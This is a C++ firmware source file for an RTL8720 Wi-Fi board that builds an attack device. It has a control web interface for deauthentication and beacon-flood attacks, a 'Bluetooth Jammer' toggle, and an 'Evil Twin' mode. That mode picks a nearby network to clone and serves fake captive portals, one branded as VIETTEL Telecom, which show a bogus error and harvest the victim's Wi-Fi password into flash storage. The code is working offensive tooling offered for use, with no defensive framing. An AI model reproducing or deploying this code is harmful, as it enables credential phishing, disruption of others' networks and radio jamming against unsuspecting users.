#ifdef max
#undef max
#endif

#include "vector"
#include "langs.h"
#include "images.h"
#include "wifi_conf.h"
#include "wifi_cust_tx.h"
#include "WiFi.h"
#include "FlashStorage_RTL8720.h"
#include "DNSServer.h"
#include <sys_api.h>
#include "FreeRTOS.h"

uint32_t currentHeap = 0;

typedef struct {
	bool selected = false;     
	String ssid;                 
	String bssid_str;           
	uint8_t bssid[6];           
	int16_t rssi;    
	uint8_t channel;        
	uint32_t security;
} WiFiScanResult;
std::vector<WiFiScanResult> scan_results;

bool scanInProgress = false;
static rtw_scan_result_t temp_ap_list[32]; 
static int temp_network_count = 0;

const int channels_2g[] = {1,2,3,4,5,6,7,8,9,10,11,12,13};
const int channels_5g[] = {36,40,44,48,52,56,60,64,100,104,108,112,116,120,124,128,149,153,157,161};

typedef struct {
	char evil_pass[64];
	char evil_ssid[30];
} PasswordEntry;
#define MAX_PASSWORDS 10
#define PASSWORDS_OFFSET 128 
PasswordEntry passwordList[MAX_PASSWORDS];

const int PASSWORDS_SIGNATURE = 0x12345678;
int passwordCount = 0; 
String latestPassword = "";
 
typedef struct {
	char apssid[30];
	char appass[30];
	char evilssid[30];
	bool hidden;
	int apchannel;
	int aplang;
} WiFiConfig;
WiFiConfig storedConfig;

const int CONFIG_SIGNATURE = 0xABCDEF12;
IPAddress local_ip(172, 0, 0, 1);
char *apssid = "CHOMTV";
char *appass = "@@@@2222";
char *evilssid = "CHOMTV";
int apchannel = 1;
int aplang = 1;
int status = WL_IDLE_STATUS; 
bool evilMode = false;

struct PendingFlashWrite {
	bool pending = false;
	char evil_pass[64];
	char evil_ssid[30];
} pendingWrite;

bool shouldRunEvilConnect = false;

WiFiServer server(80);
DNSServer dnsServer;

int frames_per_deauth = 5;
uint8_t broadcast_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

bool deauth_running = false;
bool beacon_running = false;
bool randombeacon_running = false;
bool deauthbeacon_running = false;

uint8_t deauth_bssid[6];
uint16_t deauth_reason;
int evilhtml = 1;
char random_bssid[19];

bool settime = false;
bool setstarttime = false;
bool setpausetime = false;
bool setofftime = false; 

bool deauth_waiting_to_start = false;
bool beacon_waiting_to_start = false;
bool randombeacon_waiting_to_start = false;
bool deauthbeacon_waiting_to_start = false; 

unsigned long start_time = 0;
unsigned long end_time = 0;
unsigned long pause_time = 0;
unsigned long pause_duration = 0;          
unsigned long off_time = 0;        
unsigned long off_duration = 0;

bool repeat_attack = false;
bool deauth_pause_running = false;
bool beacon_pause_running = false;
bool randombeacon_pause_running = false;
bool deauthbeacon_pause_running = false;

int attack_duration = 0;

#define RESET_BUTTON_PIN PA7
#define RESET_HOLD_TIME 10000
unsigned long listenTimereset = 0;

#define RESET_TRIGGER_PIN PA30
#define PAUSE_PIN PA25
#define START_PIN PA26
#define OFF_BLUE_PIN PB1
#define ON_BLUE_PIN PB2

struct RequestInfo {
	String method;  
	String path;   
	String query; 
};

RequestInfo parseRequest(String request) {
	RequestInfo info;
	int firstSpace = request.indexOf(' ');
	if (firstSpace != -1) {
		info.method = request.substring(0, firstSpace);
		int secondSpace = request.indexOf(' ', firstSpace + 1);
		if (secondSpace != -1) {
			String fullPath = request.substring(firstSpace + 1, secondSpace);
			int queryStart = fullPath.indexOf('?');            
			if (queryStart != -1) {
				info.path = fullPath.substring(0, queryStart);
				info.query = fullPath.substring(queryStart + 1);
			} else {
				info.path = fullPath;
				info.query = "";
			}
		}
	}    
	return info;
}

String readRequestBody(WiFiClient &client) {
	String body = "";
	int contentLength = 0;
	while (client.connected() && client.available()) {
		String line = client.readStringUntil('\n');
		if (line.startsWith("Content-Length:")) {
			contentLength = line.substring(15).toInt();
		}
		if (line == "\r" || line == "\n" || line.length() <= 2) {
			break;
		}
	}
	int remaining = contentLength;
	unsigned long startTime = millis();
	while (client.connected() && remaining > 0 && millis() - startTime < 500) {
		if (client.available()) {
			char c = client.read();
			body += c;
			remaining--;
			if (body.length() > 1024) {
				break;
			}
		}
		yield();
	}
	if (!client.connected() || remaining > 0) {
		client.stop(); 
	}
	return body;
}

String readRequest(WiFiClient &client) {
	String request = "";
	unsigned long startTime = millis();
	bool headerComplete = false;
	while (client.connected() && millis() - startTime < 500) { 
		if (client.available()) {
			char c = client.read();
			request += c;
			if (c == '\n') {
				headerComplete = true;
				break;
			}
			if (request.length() > 512) {
				break;
			}
		}
		yield(); 
	}
	if (!headerComplete || !client.connected()) {
		client.stop(); 
	}
  return request;
}

void updateSelection(WiFiClient& client, String request) {
	int networkIndexSigned = request.substring(request.indexOf('=') + 1).toInt();
	size_t networkIndex = static_cast<size_t>(networkIndexSigned);    
	String response = "HTTP/1.1 ";
	if (networkIndexSigned >= 0 && networkIndex < scan_results.size()) {
		scan_results[networkIndex].selected = !scan_results[networkIndex].selected;
		response += "200 OK\r\n";
		response += "Content-Type: text/plain\r\n";
		response += "Connection: close\r\n";
		response += "\r\n";
		response += "OK";
	} else {
		response += "400 Bad Request\r\n";
		response += "Content-Type: text/plain\r\n";
		response += "Connection: close\r\n";
		response += "\r\n";
		response += "Invalid network index";
	}   
	client.print(response);
}

void clearWiFiConfig() {
	digitalWrite(LED_R, LOW);
	digitalWrite(LED_B, HIGH);
	WiFiConfig emptyConfig = {"", "", "", false, 1, 1};
	FlashStorage.put(0, 0xFFFFFFFF);
	FlashStorage.put(sizeof(CONFIG_SIGNATURE), emptyConfig);
	delay(100);
	digitalWrite(LED_B, LOW);
	digitalWrite(LED_R, HIGH);
}

void checkResetButton() {
	static unsigned long buttonPressTime = 0;
	if (digitalRead(RESET_BUTTON_PIN) == LOW) {
		if (buttonPressTime == 0) {
			buttonPressTime = millis();
		} else if (millis() - buttonPressTime >= RESET_HOLD_TIME) clearWiFiConfig();
	} else buttonPressTime = 0;
}

String urlDecode(String input) {
  String result = "";
  for (size_t i = 0; i < input.length(); i++) {
    if (input[i] == '%' && i + 2 < input.length()) {
      String hex = input.substring(i + 1, i + 3);
      char decodedChar = (char) strtol(hex.c_str(), NULL, 16);
      result += decodedChar;
      i += 2;
    } else if (input[i] == '+') {
      result += ' ';
    } else {
      result += input[i];
    }
  }
  return result;
}

void sortScanResults() {
	for (size_t i = 0; i < scan_results.size(); i++) {
		for (size_t j = 0; j < scan_results.size() - i - 1; j++) {
			if (scan_results[j].rssi < scan_results[j + 1].rssi) {
				WiFiScanResult temp = scan_results[j];
				scan_results[j] = scan_results[j + 1];
				scan_results[j + 1] = temp;
			}
		}
	}
}

rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
	rtw_scan_result_t *record;
	if (scan_result->scan_complete != RTW_TRUE) {
		record = &scan_result->ap_details;
		record->SSID.val[record->SSID.len] = 0; 
		if (temp_network_count < 32) {
			memcpy(&temp_ap_list[temp_network_count], record, sizeof(rtw_scan_result_t));
			temp_network_count++;
		}
	} else {
		scan_results.clear();
		for (int i = 0; i < temp_network_count; i++) {
			if (temp_ap_list[i].channel >= 36 && temp_ap_list[i].channel <= 165) {
				storeNetworkDetails(temp_ap_list[i]);
			}
		}
		for (int i = 0; i < temp_network_count; i++) {
			if (temp_ap_list[i].channel < 14) {
				storeNetworkDetails(temp_ap_list[i]);
			}
		}
		sortScanResults();
		temp_network_count = 0; 
		scanInProgress = false; 
	}
	return RTW_SUCCESS;
}

void storeNetworkDetails(rtw_scan_result_t record) {
	WiFiScanResult result;
	result.ssid = String((char *)record.SSID.val);
	if (result.ssid == "") result.ssid = "";
	result.channel = record.channel;
	result.security = record.security;
	result.rssi = record.signal_strength;
	memcpy(result.bssid, record.BSSID.octet, 6);
	char bssid_str[] = "XX:XX:XX:XX:XX:XX";
	snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X",
			result.bssid[0], result.bssid[1], result.bssid[2],
			result.bssid[3], result.bssid[4], result.bssid[5]);
	result.bssid_str = bssid_str;
	scan_results.push_back(result);
}

String getSecurityTypeString(uint32_t sec_type) {
	if (sec_type == RTW_SECURITY_OPEN) return "Open";
	if (sec_type == RTW_SECURITY_WEP_PSK) return "WEP";
	if (sec_type == RTW_SECURITY_WEP_SHARED) return "WEP SHARED";
	if (sec_type == RTW_SECURITY_WPA_TKIP_PSK) return "WPA TKIP";
	if (sec_type == RTW_SECURITY_WPA_AES_PSK) return "WPA AES";
	if (sec_type == RTW_SECURITY_WPA_MIXED_PSK) return "WPA MIXED";
	if (sec_type == RTW_SECURITY_WPA_TKIP_ENTERPRISE) return "WPA TKIP_EN";
	if (sec_type == RTW_SECURITY_WPA_AES_ENTERPRISE) return "WPA AES_EN";
	if (sec_type == RTW_SECURITY_WPA_MIXED_ENTERPRISE) return "WPA MIXED_EN";
	if (sec_type == RTW_SECURITY_WPA2_AES_PSK) return "WPA2 AES";
	if (sec_type == RTW_SECURITY_WPA2_TKIP_PSK) return "WPA2 TKIP";
	if (sec_type == RTW_SECURITY_WPA2_MIXED_PSK) return "WPA2 MIXED";
	if (sec_type == RTW_SECURITY_WPA2_AES_CMAC) return "WPA2 AES_CMAC";
	if (sec_type == RTW_SECURITY_WPA2_TKIP_ENTERPRISE) return "WPA2 TKIP_EN";
	if (sec_type == RTW_SECURITY_WPA2_AES_ENTERPRISE) return "WPA2 AES_EN";
	if (sec_type == RTW_SECURITY_WPA2_MIXED_ENTERPRISE) return "WPA2 MIXED_EN";
	if (sec_type == RTW_SECURITY_WPA_WPA2_TKIP_PSK) return "WPA/WPA2 TKIP";
	if (sec_type == RTW_SECURITY_WPA_WPA2_AES_PSK) return "WPA/WPA2 AES";
	if (sec_type == RTW_SECURITY_WPA_WPA2_MIXED_PSK) return "WPA/WPA2 MIXED";
	if (sec_type == RTW_SECURITY_WPA_WPA2_TKIP_ENTERPRISE) return "WPA/WPA2 TKIP_EN";
	if (sec_type == RTW_SECURITY_WPA_WPA2_AES_ENTERPRISE) return "WPA/WPA2 AES_EN";
	if (sec_type == RTW_SECURITY_WPA_WPA2_MIXED_ENTERPRISE) return "WPA/WPA2 MIXED_EN";
	if (sec_type == RTW_SECURITY_WPS_OPEN) return "WPS/Open";
	if (sec_type == RTW_SECURITY_WPS_SECURE) return "WPS/Secure";
	if (sec_type == RTW_SECURITY_WPA3_AES_PSK) return "WPA3";
	if (sec_type == RTW_SECURITY_WPA2_WPA3_MIXED) return "WPA2/WPA3";
	if (sec_type == RTW_SECURITY_FORCE_32_BIT) return "FORCE/32";
	return "Unknown";
}

int scanNetworksAsync() {
	if (scanInProgress) return 2;
	scan_results.clear();
	temp_network_count = 0;
	scanInProgress = true;
	if (wifi_scan_networks_mcc(scanResultHandler, NULL) == RTW_SUCCESS) {
		return 0;
	}
	scanInProgress = false;
	return 1;
}

String generaterandom_ssid(int len){
	String randstr = "";
	const char setchar[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
	for (int i = 0; i < len; i++){
		int index = random(0,strlen(setchar));
		randstr += setchar[index];
	} return randstr;
}

String makeResponse(int code, String content_type) {
	String response = "HTTP/1.1 " + String(code) + " OK\n";
	response += "Content-Type: " + content_type + "\n";
	response += "Connection: close\n\n";
	return response;
}

String getValue(String data, String key, String delimiter) {
	int keyIndex = data.indexOf(key);
	if (keyIndex == -1) {
		return ""; 
	}
	int startIndex = keyIndex + key.length();
	int endIndex = delimiter.length() > 0 ? data.indexOf(delimiter, startIndex) : data.length();
	if (endIndex == -1) {
		endIndex = data.length(); 
	}
	return data.substring(startIndex, endIndex);
}

String generateChannelOptions(int currentChannel, const int* channels, int size) {
	String html = "";
	for (int i = 0; i < size; i++) {
		html += "<option value='" + String(channels[i]) + "'";
		if (currentChannel == channels[i]) html += " selected";
		html += ">" + String(channels[i]) + "</option>\n";
	}
	return html;
}

String htmlEscape(String input) {
	String result = input;
	result.replace("&", "&amp;");
	result.replace("<", "&lt;");
	result.replace(">", "&gt;");
	result.replace("\"", "&quot;");
	result.replace("'", "&#39;");
	return result;
}

void sendBluePage(WiFiClient& client) {
	FlashStorage.get(sizeof(CONFIG_SIGNATURE), storedConfig);
	int currentaplang = storedConfig.aplang;
	String response = makeResponse(200, "text/html") + R"(
	<!DOCTYPE HTML>
	<html lang='vi-VN'><head>
	<title>Bluetooth Jammer</title>
	<meta charset='UTF-8' name=viewport content='width=device-width,initial-scale=1'>
	<style>
		body{background:#030303;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI','Noto Sans',Helvetica,Arial,sans-serif,'Apple Color Emoji','Segoe UI Emoji';font-size:small;margin:0;padding:0;display:flex;justify-content:center;align-items:center;height:100vh}.container{width:100%;max-width:400px;padding:10px;border-radius:5px;box-shadow:0 0 10px #8c0000;text-align:center;box-sizing:border-box;margin:5px}a{text-decoration:none;color:#007bff}a:hover{color:#0056b3}.slider-container{width:300px;height:80px;background:#00488d;border-radius:40px;position:relative;box-shadow:inset 0 0 10px rgba(0,0,0,.2);margin:10px auto;display:flex}.slider-zone{flex:1;height:100%;cursor:pointer}.slider-button{width:70px;height:70px;background:linear-gradient(145deg,#4CAF50,#8c0000);border-radius:50%;position:absolute;top:50%;transform:translateY(-50%);transition:left .3s ease-in-out;box-shadow:3px 3px 5px rgba(0,0,0,.3)}.slider-container[data-state='0'] .slider-button{left:5px}.slider-container[data-state='1'] .slider-button{left:115px}.slider-container[data-state='2'] .slider-button{left:225px}.button-container{position:fixed;top:0;left:0;width:100%;display:flex;justify-content:space-around;z-index:1000}.top-button{background-color:#8c0000;color:#fff;padding:10px 20px;border:none;border-radius:0 0 15px 15px;cursor:pointer;box-shadow:0 2px 5px rgba(0,0,0,.2);transition:all .3s ease;min-width:200px;text-align:center}.top-button:hover{background-color:#45a049;transform:translateY(2px)}
	</style>
	</head><body>
	<div class='container'>
	<div class='slider-container' data-state='1'>
		<div class='slider-button'></div>
		<div class='slider-zone' onclick='setSlider(0)'></div>
		<div class='slider-zone' onclick='setSlider(1)'></div>
		<div class='slider-zone' onclick='setSlider(2)'></div>
	</div>
	<div class='button-container'>
	)";
	response += "<button class='top-button' onclick='window.location.href=\"/\"'>" + String(HOME[currentaplang]) + "</button>";
	response += R"(
	</div>
	</div>
	<script>
		let resetTimer; function setSlider(state) { clearTimeout(resetTimer); document.querySelector('.slider-container').setAttribute('data-state', state);  let url = ""; if (state === 0) url = "/off_blue"; else if (state === 2) url = "/on_blue";  if (url) { fetch(url).then(response => console.log(response.status)).catch(error => console.error(error)); resetTimer = setTimeout(() => { document.querySelector('.slider-container').setAttribute('data-state', 1); }, 1000); } }
	</script>
	</body></html>)";
	client.write(response.c_str());
}

void sendEvilPage(WiFiClient& client) {
	FlashStorage.get(sizeof(CONFIG_SIGNATURE), storedConfig);
	String currentevilssid = (strlen(storedConfig.evilssid) > 0) ? String(storedConfig.evilssid) : String(evilssid);
	int currentaplang = storedConfig.aplang;
	String response = makeResponse(200, "text/html") + R"(
	<!DOCTYPE html>
	<html lang='vi-VN'><head>
	<title>Evil Twin</title>
	<meta charset='UTF-8' name=viewport content='width=500px'>
	<style>
		body{background:#030303;color:#fff;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI','Noto Sans',Helvetica,Arial,sans-serif,'Apple Color Emoji','Segoe UI Emoji';margin:0;padding:0;display:flex;justify-content:center;align-items:center}.container{width:500px;text-align:center;margin:50px 10px}form{margin:10px auto}input{width:100%;padding:12px;margin:8px 0;box-sizing:border-box;border-radius:5px;border:1px solid #fff}table{--border:1px solid white;border-radius:5px;border-spacing:0;border-collapse:separate;border:var(--border);overflow:hidden;width:100%;box-shadow:0 0 10px #8c0000}table th:not(:last-child),table td:not(:last-child){border-right:var(--border)}table>thead>tr:not(:last-child)>th,table>thead>tr:not(:last-child)>td,table>tbody>tr:not(:last-child)>th,table>tbody>tr:not(:last-child)>td,table>tfoot>tr:not(:last-child)>th,table>tfoot>tr:not(:last-child)>td,table>tr:not(:last-child)>td,table>tr:not(:last-child)>th,table>thead:not(:last-child),table>tbody:not(:last-child),table>tfoot:not(:last-child){border-bottom:var(--border)}th{background:#8c0000;padding:10px}tr:nth-child(even){background:#010d23}th,td{padding:10px}.btn-primary{background:#00488d;color:#fff;cursor:pointer;font-weight:bold;transition:.3s;border:none;border-radius:5px;padding:12px;font-size:1em}.btn-primary:hover{background:#8c0000}.button-container{position:fixed;top:0;left:0;width:100%;display:flex;justify-content:space-around;z-index:1000}.top-button{background-color:#8c0000;color:#fff;padding:10px 20px;border:none;border-radius:0 0 15px 15px;cursor:pointer;box-shadow:0 2px 5px rgba(0,0,0,.2);transition:all .3s ease;min-width:100px;text-align:center}.top-button:hover{background-color:#45a049;transform:translateY(2px)}
	</style>
	</head><body>
	<div class='container'>
	<div>)" + String(ENTER[currentaplang]) + R"(</div>
		<form action='/post_evilssid' method='post' onsubmit='return reloadWithDelay()'>
		<center>
			<input type='text' name='e' placeholder=')" + currentevilssid + R"(' required>
			<input class='btn-primary' type='submit' value=')" + String(CHANGEEVIL[currentaplang]) + R"('>
		</center>
		</form>
		<table><tr><th>)" + String(SSID[currentaplang]) + R"(</th><th>)" + String(RSSI[currentaplang]) + R"(</th><th>)" + String(FREQUENCY[currentaplang]) + R"(</th><th>)" + String(SELECT[currentaplang]) + R"(</th></tr>
	)";
	for (size_t i = 0; i < scan_results.size(); i++) {
		if (scan_results[i].ssid.length() == 0) continue;
		response += "<tr>";
		response += "<td>" + scan_results[i].ssid + "</td>";
		response += "<td>" + String(scan_results[i].rssi) + "</td>";
		response += "<td>" + (String)((scan_results[i].channel >= 36) ? "5GHz" : "2.4GHz") + "</td>";
		response += "<td><button class='btn-primary' onclick=\"setSSID('" + scan_results[i].ssid + "')\">" + String(SELECT[currentaplang]) + "</button></td>";
		response += "</tr>";
	}
	response += R"(
		</table>
	<div class='button-container'>
	)";
	response += "<button class='top-button' onclick='window.location.href=\"/\"'>" + String(HOME[currentaplang]) + "</button>";
	response += "<button class='top-button' onclick='window.location.href=\"/logs\"'>" + String(LOGS[currentaplang]) + "</button>";
	response += "<button class='top-button' onclick='window.location.href=\"/evil_html\"'>" + String(HTML_PAGE[currentaplang]) + "</button>";
	response += R"(
	</div>
	</div>
	<script>
		function setSSID(ssid) { window.scrollTo({ top: 0, behavior: 'smooth' }); const input = document.querySelector("input[name='e']"); input.value = ssid; setTimeout(() => { document.querySelector("form").submit(); }, 500); } function reloadWithDelay() { setTimeout(() => { location.reload(); }, 500); }
	</script>
	</body></html>)";
	client.write(response.c_str());
}

void EvilPage1(WiFiClient& client) {
	FlashStorage.get(sizeof(CONFIG_SIGNATURE), storedConfig);
	String currentevilssid = (strlen(storedConfig.evilssid) > 0) ? String(storedConfig.evilssid) : String(evilssid);
	int currentaplang = storedConfig.aplang;
	String response = makeResponse(200, "text/html") + R"(
	<!DOCTYPE html>
	<html lang='vi-VN'><head>
	<title>Kết nối Wi-Fi</title>
	<meta charset='UTF-8' name=viewport content='width=device-width,initial-scale=1'>
	<style>
		body{background:linear-gradient(to right,#e3f2fd,#f0f4ff);color:#222;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI','Noto Sans',Helvetica,Arial,sans-serif,'Apple Color Emoji','Segoe UI Emoji';margin:0;padding:0;display:flex;justify-content:center;align-items:center;height:100vh}.container{width:100%;max-width:400px;background:#fff;padding:20px;border-radius:10px;box-shadow:0 6px 20px rgba(0,0,0,.1);text-align:center;box-sizing:border-box;margin:auto 10px;animation:fadeIn .8s ease}@keyframes fadeIn{from{opacity:0;transform:scale(.95)}to{opacity:1;transform:scale(1)}}.input-container{position:relative;width:100%;margin:8px 0}.password{width:100%;padding:9px 40px 9px 10px;box-sizing:border-box;border-radius:8px;border:1px solid #ccc;box-shadow:0 2px 4px rgba(0,0,0,.1);transition:all .3s ease}.password:focus{border-color:#1f7ed0;box-shadow:0 0 0 3px rgba(31,126,208,.2);outline:none}.show-password{display:flex;align-items:center;gap:5px;margin-top:5px;justify-content:flex-start;font-weight:500;color:#333;user-select:none}nav{background:#1f7ed0;color:#fff;display:block;font-size:1.3em;padding:1em;margin-bottom:10px;border-radius:8px 8px 0 0;box-shadow:0 2px 4px rgba(0,0,0,.1)}nav b{display:block;font-size:1em;margin:.5em auto}img{padding:10px}.btn-primary{width:100%;background:linear-gradient(135deg,#1f7ed0,#5595e9);color:#fff;cursor:pointer;font-weight:bold;transition:background .3s ease,transform .2s ease;border:none;border-radius:5px;padding:12px;font-size:1em;box-shadow:0 4px 8px rgba(31,126,208,.3)}.btn-primary:hover{background:linear-gradient(135deg,#0056b3,#397cd0);transform:translateY(-2px)}.button-container{position:fixed;top:0;left:0;width:100%;display:flex;justify-content:space-around;z-index:1000}.top-button{background-color:#1f7ed0;color:#fff;padding:10px 20px;border:none;border-radius:0 0 15px 15px;cursor:pointer;box-shadow:0 2px 5px rgba(0,0,0,.2);transition:all .3s ease;min-width:100px;text-align:center;font-weight:500}.top-button:hover{background-color:#45a049;transform:translateY(2px)}.evilhtml-tabs{position: fixed;top: 60px;left: 0;width: 100%;display: flex;justify-content: center;background-color: #f0f4ff;padding: 10px 0;box-shadow: 0 2px 5px rgba(0,0,0,0.1);z-index: 999;gap: 10px;border-radius: 0 0 15px 15px}.tab-btn{background-color: #fff;border: 2px solid #1f7ed0;color: #1f7ed0;padding: 10px 20px;border-radius: 20px;cursor: pointer;font-weight: 500;transition: 0.3s}.tab-btn:hover{background-color: #1f7ed0;color: #fff}.tab-btn.active{background-color: #1f7ed0;color: #fff}
	</style>
	</head><body>
	<div class='container'>
	<nav>    
		<b>)" + currentevilssid + R"(</b>
		<i>)" + String(ERROR500[currentaplang]) + R"(</i>
	</nav>
	<div>)" + String(ENTERPASSWORD[currentaplang]) + R"(</div>
		<form action='/post' method='post' onsubmit='return validateForm()'>
		<center>
			<div class='input-container'>
				<input type='password' class='password' name='m' minlength='8' id='password' required>
				<label class='show-password'>
					<input type='checkbox' onclick='myFunction()'>
					)" + String(SHOWPASSWORD[currentaplang]) + R"(
				</label>
			</div>
			<input class='btn-primary' type='submit' value=')" + String(CONNECT[currentaplang]) + R"('>
			<p>© Telecom 2025. All rights reserved.</p>
		</center>
		</form>
	)";
	if (!evilMode) {
		if (evilhtml != 1 && evilhtml != 2 && evilhtml != 3 && evilhtml != 4 && evilhtml != 5 && evilhtml != 6) evilhtml = 1;
		response += R"(
		<div class='evilhtml-tabs'>
			<button class='tab-btn )" + String(evilhtml == 1 ? "active" : "") + R"(' onclick='updateHtml(1, this)'>1</button>
			<button class='tab-btn )" + String(evilhtml == 2 ? "active" : "") + R"(' onclick='updateHtml(2, this)'>2</button>
			<button class='tab-btn )" + String(evilhtml == 3 ? "active" : "") + R"(' onclick='updateHtml(3, this)'>3</button>
			<button class='tab-btn )" + String(evilhtml == 4 ? "active" : "") + R"(' onclick='updateHtml(4, this)'>4</button>
			<button class='tab-btn )" + String(evilhtml == 5 ? "active" : "") + R"(' onclick='updateHtml(5, this)'>5</button>
			<button class='tab-btn )" + String(evilhtml == 6 ? "active" : "") + R"(' onclick='updateHtml(6, this)'>6</button>
		</div>
		)";
		response += "<div class='button-container'>";
		response += "<button class='top-button' onclick='window.location.href=\"/evil\"'>" + String(BACK[currentaplang]) + "</button>";
		response += "<button class='top-button' onclick='window.location.href=\"/logs\"'>" + String(LOGS[currentaplang]) + "</button>";
		response += "<button class='top-button' onclick='window.location.href=\"/start_evil\"'>" + String(START[currentaplang]) + "</button>";
		response += "</div>";
	}
	response += R"(
	</div>
	<script>
		function reloadWithDelay(waittime) { setTimeout(() => { location.reload(); }, waittime); } function updateHtml(value, el) { var xhr = new XMLHttpRequest(); xhr.open('GET', '/set_evilhtml?evilhtml=' + value, true); xhr.send(); var buttons = document.querySelectorAll('.tab-btn'); buttons.forEach(btn => btn.classList.remove('active')); if (el) el.classList.add('active'); reloadWithDelay(100); } function validateForm() { var password = document.getElementById('password').value; if (password.length < 8) { alert(')" + String(ALERTPASSWORD[currentaplang]) + R"('); return false; }  return true; } function myFunction() { var x = document.getElementById("password"); if (x.type === "password") { x.type = "text"; } else { x.type = "password"; } }	
	</script>
	</body></html>)";
	client.print(response.c_str());
}

void EvilPage2(WiFiClient& client) {
	FlashStorage.get(sizeof(CONFIG_SIGNATURE), storedConfig);
	String currentevilssid = (strlen(storedConfig.evilssid) > 0) ? String(storedConfig.evilssid) : String(evilssid);
	int currentaplang = storedConfig.aplang;
	String response = makeResponse(200, "text/html") + R"(
	<!DOCTYPE html>
	<html lang='vi-VN'><head>
	<title>Kết nối Wi-Fi</title>
	<meta charset='UTF-8' name=viewport content='width=device-width,initial-scale=1'>
	<style>
		body{background:linear-gradient(to right,#e3f2fd,#f0f4ff);color:#222;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI','Noto Sans',Helvetica,Arial,sans-serif,'Apple Color Emoji','Segoe UI Emoji';margin:0;padding:0;display:flex;justify-content:center;align-items:center;height:100vh}.container{width:100%;max-width:400px;background:#fff;padding:20px;border-radius:10px;box-shadow:0 6px 20px rgba(0,0,0,.1);text-align:center;box-sizing:border-box;margin:auto 10px;animation:fadeIn .8s ease}@keyframes fadeIn{from{opacity:0;transform:scale(.95)}to{opacity:1;transform:scale(1)}}.input-container{position:relative;width:100%;margin:8px 0}.password{width:100%;padding:9px 40px 9px 10px;box-sizing:border-box;border-radius:8px;border:1px solid #ccc;box-shadow:0 2px 4px rgba(0,0,0,.1);transition:all .3s ease}.password:focus{border-color:#1f7ed0;box-shadow:0 0 0 3px rgba(31,126,208,.2);outline:none}.show-password{display:flex;align-items:center;gap:5px;margin-top:5px;justify-content:flex-start;font-weight:500;color:#333;user-select:none}nav{background:#f3052c;color:#fff;display:block;font-size:1.3em;padding:1em;margin-bottom:10px;border-radius:8px 8px 0 0;box-shadow:0 2px 4px rgba(0,0,0,.1)}nav b{display:block;font-size:1em;margin:.5em auto}img{padding:10px}.btn-primary{width:100%;background:linear-gradient(135deg,#f3052c,#5595e9);color:#fff;cursor:pointer;font-weight:bold;transition:background .3s ease,transform .2s ease;border:none;border-radius:5px;padding:12px;font-size:1em;box-shadow:0 4px 8px rgba(31,126,208,.3)}.btn-primary:hover{background:linear-gradient(135deg,#0056b3,#f3052c);transform:translateY(-2px)}.button-container{position:fixed;top:0;left:0;width:100%;display:flex;justify-content:space-around;z-index:1000}.top-button{background-color:#1f7ed0;color:#fff;padding:10px 20px;border:none;border-radius:0 0 15px 15px;cursor:pointer;box-shadow:0 2px 5px rgba(0,0,0,.2);transition:all .3s ease;min-width:100px;text-align:center;font-weight:500}.top-button:hover{background-color:#45a049;transform:translateY(2px)}.evilhtml-tabs{position: fixed;top: 60px;left: 0;width: 100%;display: flex;justify-content: center;background-color: #f0f4ff;padding: 10px 0;box-shadow: 0 2px 5px rgba(0,0,0,0.1);z-index: 999;gap: 10px;border-radius: 0 0 15px 15px}.tab-btn{background-color: #fff;border: 2px solid #1f7ed0;color: #1f7ed0;padding: 10px 20px;border-radius: 20px;cursor: pointer;font-weight: 500;transition: 0.3s}.tab-btn:hover{background-color: #1f7ed0;color: #fff}.tab-btn.active{background-color: #1f7ed0;color: #fff}
	</style>
	</head><body>
	<div class='container'>
	<img src='viettel.png' class='img-responsive'>
	<nav>    
		<b>)" + currentevilssid + R"(</b>
		<i>)" + String(ERROR500[currentaplang]) + R"(</i>
	</nav>
	<div>)" + String(ENTERPASSWORD[currentaplang]) + R"(</div>
		<form action='/post' method='post' onsubmit='return validateForm()'>
		<center>
			<div class='input-container'>
				<input type='password' class='password' name='m' minlength='8' id='password' required>
				<label class='show-password'>
					<input type='checkbox' onclick='myFunction()'>
					)" + String(SHOWPASSWORD[currentaplang]) + R"(
				</label>
			</div>
			<input class='btn-primary' type='submit' value=')" + String(CONNECT[currentaplang]) + R"('>
			<p>© VIETTEL Telecom 2025. All rights reserved.</p>
		</center>
		</form>
	)";
	if (!evilMode) {
		if (evilhtml != 1 && evilhtml != 2 && evilhtml != 3 && evilhtml != 4 && evilhtml != 5 && evilhtml != 6) evilhtml = 1;
		response += R"(
		<div class='evilhtml-tabs'>
			<button class='tab-btn )" + String(evilhtml == 1 ? "active" : "") + R"(' onclick='updateHtml(1, this)'>1</button>
			<button class='tab-btn )" + String(evilhtml == 2 ? "active" : "") + R"(' onclick='updateHtml(2, this)'>2</button>
			<button class='tab-btn )" + String(evilhtml == 3 ? "active" : "") + R"(' onclick='updateHtml(3, this)'>3</button>
			<button class='tab-btn )" + String(evilhtml == 4 ? "active" : "") + R"(' onclick='updateHtml(4, this)'>4</button>
			<button class='tab-btn )" + String(evilhtml == 5 ? "active" : "") + R"(' onclick='updateHtml(5, this)'>5</button>
			<button class='tab-btn )" + String(evilhtml == 6 ? "active" : "") + R"(' onclick='updateHtml(6, this)'>6</button>
		</div>
		)";
		response += "<div class='button-container'>";
		response += "<button class='top-button' onclick='window.location.href=\"/evil\"'>" + String(BACK[currentaplang]) + "</button>";
		response += "<button class='top-button' onclick='window.location.href=\"/logs\"'>" + String(LOGS[currentaplang]) + "</button>";
		response += "<button class='top-button' onclick='window.location.href=\"/start_evil\"'>" + String(START[currentaplang]) + "</button>";
		response += "</div>";
	}
	response += R"(
	</div>
	<script>
		function reloadWithDelay(waittime) { setTimeout(() => { location.reload(); }, waittime); } function updateHtml(value, el) { var xhr = new XMLHttpRequest(); xhr.open('GET', '/set_evilhtml?evilhtml=' + value, true); xhr.send(); var buttons = document.querySelectorAll('.tab-btn'); buttons.forEach(btn => btn.classList.remove('active')); if (el) el.classList.add('active'); reloadWithDelay(100); } function validateForm() { var password = document.getElementById('password').value; if (password.length < 8) { alert(')" + String(ALERTPASSWORD[currentaplang]) + R"('); return false; }  return true; } function myFunction() { var x = document.getElementById("password"); if (x.type === "password") { x.type = "text"; } else { x.type = "password"; } }	
	</script>
	</body></html>)";
	client.print(response.c_str());
}

